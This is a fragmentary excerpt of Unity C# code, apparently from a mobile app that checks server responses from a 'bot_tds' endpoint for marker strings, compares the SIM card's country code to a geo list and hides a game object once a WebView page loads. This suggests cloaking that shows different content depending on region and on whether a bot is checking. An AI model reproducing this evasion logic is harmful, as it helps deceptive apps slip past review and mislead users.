...
public class Engine : MonoBehaviour
{
	...
	const string nocont = "sdew";
	const string nozim = "kloe4";
	...
	IEnumerator SetupEncryptDataNoNull()
	{
		...
		{
            if (responce_from_server.Contains(nocont))
            {
                OnFinalActionEvent?.Invoke(string.Empty);
                yield break;
            }
	...
	IEnumerator Get_First_Request(string uri)
	{
		...
		if(bot_tds_responce.Contains(nocont))
		{
			OnFinalActionEvent?.Invoke(string.Empty);
			yield break;
        }
	...
	{
		int startIndexCom = (int)char.GetNumericValue(beforeString[0]);
		int lenghtCom = (int)char.GetNumericValue(beforeString[1]);

        Regex regex = new Regex(@"\[.*?\]");
        var res = regex.Matches(beforeString);
        string geoString = res[0].Value.Substring(1, res[0].Value.Length - 2);
        string[] geoArray = geoString.Split(',');

        bool IsNozim = geoArray.Contains(nozim);
        geoContains = IsNozim || geoString.Contains(Simcard.Instance.GetTwoSmallLetterCountryCodeISO().ToLower());

        return beforeString.Substring(startIndexCom, lenghtCom);
    }
	...
	void CacheComponents()
	{
        ...
        View.OnPageFinished += (browser, code, url) =>
        {
            ...
            GameObject.Find("laius").SetActive(false);
